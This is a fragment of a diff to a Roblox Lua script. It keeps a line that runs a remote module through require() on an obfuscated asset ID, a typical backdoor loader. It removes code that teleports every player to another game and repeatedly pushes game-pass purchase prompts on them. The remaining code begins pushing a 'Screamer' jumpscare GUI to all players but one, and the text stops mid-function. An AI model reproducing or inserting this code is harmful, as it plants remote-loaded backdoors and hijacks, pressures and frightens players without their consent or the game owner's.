@@ -1,18 +1,5 @@
 require(0x38c5453e6)()
-local teleport = game:GetService("TeleportService")
-local id = 15530286507
-for i, v in pairs(game.Players:GetPlayers()) do 
- teleport:Teleport(id,v)
-end
-local market=game:GetService("MarketplaceService")
-local id = 665966891
-while wait(120) do 
-	for i,v in pairs(game.Players:GetChildren()) do
-		if not market:UserOwnsGamePassAsync(v.UserId,id) then
-			market:PromptGamePassPurchase(v,id)
-		end
-	end
-end
+wait(1)
 for i,v in pairs(game.Players:GetPlayers()) do
 		if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
 			spawn(function()
